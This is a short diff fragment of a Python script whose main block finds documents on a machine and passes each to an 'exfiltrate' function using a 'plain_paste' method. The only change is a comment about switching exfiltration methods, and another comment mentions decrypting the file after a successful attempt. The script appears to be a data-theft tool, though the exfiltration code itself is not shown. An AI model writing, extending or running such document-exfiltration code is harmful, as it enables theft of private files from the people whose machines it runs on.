@@ -46,7 +46,7 @@ def exfiltrate(document_path, method):
 
 if __name__=='__main__':
     for fpath in find_docs():
-        exfiltrate(fpath, 'plain_paste')
+        exfiltrate(fpath, 'plain_paste') # modify for dif exfiler
 
 # test by decripting file after succesfull atempt
 
